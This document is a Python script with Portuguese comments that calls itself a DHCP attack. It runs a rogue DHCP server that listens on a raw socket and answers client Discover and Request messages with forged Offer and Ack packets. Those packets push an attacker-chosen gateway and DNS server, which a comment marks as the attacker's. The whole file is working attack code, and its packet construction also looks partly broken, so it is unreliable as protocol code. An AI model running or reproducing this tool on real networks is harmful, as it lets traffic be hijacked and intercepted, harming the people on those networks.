import socket
import struct
import random
import sys
import uuid

def get_mac_address():
    mac_int = uuid.getnode()  # Get the MAC address as a 48-bit integer
    mac_bytes = mac_int.to_bytes(6, byteorder='big')  # Convert to bytes

    # Format the bytes as '\x1c\x1b\x0d\xf1\x9a\xb0'
    formatted_mac = b''.join([bytes([int(b)]) for b in mac_bytes])
    return formatted_mac

# Funções auxiliares para calcular o checksum dos pacotes IP
def calculate_checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff

    return s

# Criação do socket RAW para interceptar pacotes DHCP
def create_socket(server_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.bind((server_ip, 67)) 
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    print("Socket Criado...")
    return s

# Função para criar pacotes DHCP Offer
def create_dhcp_offer(transaction_id, server_mac, client_mac, server_ip, offered_ip, subnet_mask, router_ip, dns_ip, lease_time):
    dest_mac = client_mac
    src_mac = server_mac
    eth_type = b'\x08\x00'  # Type: IPv4

    eth_header = dest_mac + src_mac + eth_type

    # Define IP header fields
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 0  # Kernel will fill the correct total length
    packet_id = random.randint(0, 65535)
    fragment_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_UDP
    source_ip = socket.inet_aton(server_ip)
    dest_ip = b'\xff\xff\xff\xff'  # Broadcast address

    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, 0, source_ip, dest_ip)

    ip_checksum = calculate_checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, ip_checksum, source_ip, dest_ip)

    # Define UDP header fields
    source_port = 67
    dest_port = 68
    length = 0  # Kernel will fill the correct length
    checksum = 0

    udp_header = struct.pack('!HHHH', source_port, dest_port, length, checksum)

    # Define DHCP header fields
    op = b'\x02'              # Boot Reply (Ack)
    htype = b'\x01'           # Ethernet
    hlen = b'\x06'            # Hardware address length
    hops = b'\x00'
    xid = transaction_id  
    secs = b'\x00\x00'
    flags = b'\x80\x00'       # Broadcast flag
    ciaddr = b'\x00\x00\x00\x00'
    yiaddr = socket.inet_aton(offered_ip)
    siaddr = socket.inet_aton(server_ip)
    giaddr = b'\x00\x00\x00\x00'
    chaddr = client_mac + b'\x00' * 10
    sname = b'\x00' * 64
    file = b'\x00' * 128

    dhcp_header = op + htype + hlen + hops + xid + secs + flags + ciaddr + yiaddr + siaddr + giaddr + chaddr + sname + file

    # Define DHCP options
    options = b''
    options += b'\x63\x82\x53\x63'  # Magic cookie
    options += b'\x35\x01\x02'  # DHCP Offer
    options += b'\x01\x04' + socket.inet_aton(subnet_mask)  # Subnet mask
    options += b'\x03\x04' + socket.inet_aton(router_ip)  # Router
    options += b'\x06\x04' + socket.inet_aton(dns_ip)  # DNS server
    options += b'\x33\x04' + struct.pack('!I', lease_time)  # Lease time
    options += b'\xff'  # End option

    # Calculate UDP length and checksum
    udp_length = 8 + len(dhcp_header) + len(options)
    pseudo_header = source_ip + dest_ip + struct.pack('!BBH', 0, protocol, udp_length)
    udp_checksum = calculate_checksum(pseudo_header + udp_header + dhcp_header + options)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)

    # Construct the final packet
    packet = eth_header + ip_header + udp_header + dhcp_header + options

    return packet


# Função para criar pacotes DHCP Acknowledgement
def create_dhcp_ack(transaction_id, server_mac, client_mac, server_ip, offered_ip, subnet_mask, router_ip, dns_ip, lease_time):
    dest_mac = client_mac
    src_mac = server_mac
    eth_type = b'\x08\x00'  # Type: IPv4

    eth_header = dest_mac + src_mac + eth_type

    # Define IP header fields
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 0  # Kernel will fill the correct total length
    packet_id = random.randint(0, 65535)
    fragment_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_UDP
    source_ip = socket.inet_aton(server_ip)
    dest_ip = b'\xff\xff\xff\xff'  # Broadcast address

    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, 0, source_ip, dest_ip)

    ip_checksum = calculate_checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, ip_checksum, source_ip, dest_ip)

    # Define UDP header fields
    source_port = 67
    dest_port = 68
    length = 0  # Kernel will fill the correct length
    checksum = 0

    udp_header = struct.pack('!HHHH', source_port, dest_port, length, checksum)

    # Define DHCP header fields
    op = b'\x02'              # Boot Reply (Ack)
    htype = b'\x01'           # Ethernet
    hlen = b'\x06'            # Hardware address length
    hops = b'\x00'
    xid = transaction_id  
    secs = b'\x00\x00'
    flags = b'\x80\x00'       # Broadcast flag
    ciaddr = b'\x00\x00\x00\x00'
    yiaddr = socket.inet_aton(offered_ip)
    siaddr = socket.inet_aton(server_ip)
    giaddr = b'\x00\x00\x00\x00'
    chaddr = client_mac + b'\x00' * 10
    sname = b'\x00' * 64
    file = b'\x00' * 128

    dhcp_header = op + htype + hlen + hops + xid + secs + flags + ciaddr + yiaddr + siaddr + giaddr + chaddr + sname + file

    # Define DHCP options
    options = b''
    options += b'\x63\x82\x53\x63'  # Magic cookie
    options += b'\x35\x01\x05'  # DHCP Ack
    options += b'\x01\x04' + socket.inet_aton(subnet_mask)  # Subnet mask
    options += b'\x03\x04' + socket.inet_aton(router_ip)  # Router
    options += b'\x06\x04' + socket.inet_aton(dns_ip)  # DNS server
    options += b'\x33\x04' + struct.pack('!I', lease_time)  # Lease time
    options += b'\xff'  # End option

    # Calculate UDP length and checksum
    udp_length = 8 + len(dhcp_header) + len(options)
    pseudo_header = source_ip + dest_ip + struct.pack('!BBH', 0, protocol, udp_length)
    udp_checksum = calculate_checksum(pseudo_header + udp_header + dhcp_header + options)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)

    # Construct the final packet
    packet = eth_header + ip_header + udp_header + dhcp_header + options

    return packet


# Função principal para executar o ataque DHCP
def dhcp_attack():
    print("Servidor em execução...")

    hostname = socket.gethostname()

    server_ip = socket.gethostbyname(hostname)
    s = create_socket(server_ip)
    print("SERVER IP: ", server_ip)

    server_mac = get_mac_address()
    print("Server MAC: ", server_mac)
    offered_ip = '192.168.1.100'

    subnet_mask = '255.255.255.0'
    router_ip = '192.168.1.1'
    dns_ip = '8.8.8.8'      # DNS DO SERVIDOR ATACANTE
    lease_time = 3600  

    while True:
        try:
            print("Escutando...")
            packet, addr = s.recvfrom(4096)

            print("Pacote Recebido:", packet)
            print("Endereço:", addr)

            #dhcp_packet = packet[:]

            message_type = packet[284-14]
            print("Message Type: ", message_type)

            ## dados do header eth


            ## dados do header ip


            #transaction_id = dhcp_header[4:8]
            transaction_id = packet[46-14:50-14]
            print("Transaction ID: ", transaction_id.hex())
            client_mac = packet[70-14:76-14]
            print("Client MAC: ", client_mac.hex())


            # Envia Pacotes
            if message_type == 1:
                print(f'DHCP Discover recebido de {addr}, enviando DHCP Offer')
                offer_packet = create_dhcp_offer(transaction_id, server_mac, client_mac, server_ip, offered_ip, subnet_mask, router_ip, dns_ip, lease_time)
                s.sendto(offer_packet, ('<broadcast>', 68))

            elif message_type == 3:
                print(f'DHCP Request recebido de {addr}, enviando DHCP Acknowledgement')
                ack_packet = create_dhcp_ack(transaction_id, server_mac, client_mac, server_ip, offered_ip, subnet_mask, router_ip, dns_ip, lease_time)
                s.sendto(ack_packet, ('<broadcast>', 68))
        
        except BlockingIOError:
            pass

if __name__ == "__main__":
   try:
       dhcp_attack()
   except PermissionError:
       print("Erro: Este programa deve ser executado com privilégios de superusuário.")
       sys.exit(1)
